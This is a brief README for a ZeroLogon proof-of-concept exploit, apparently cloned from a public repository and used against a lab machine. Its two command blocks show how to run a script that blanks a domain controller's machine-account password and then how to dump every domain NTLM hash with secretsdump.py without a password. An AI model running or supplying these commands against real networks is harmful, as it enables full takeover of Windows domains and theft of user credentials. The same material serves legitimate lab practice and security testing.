# ZeroLogOn PoC

Repo cloned from: https://github.com/risksense/zerologon

Usage:
```bash
python3 set_empty_pw.py machineName/DomainName machineIPaddress
```

```bash
# obtain all NTML hashes
secretsdump.py -just-dc -no-pass FUSE\$@10.10.10.193
```
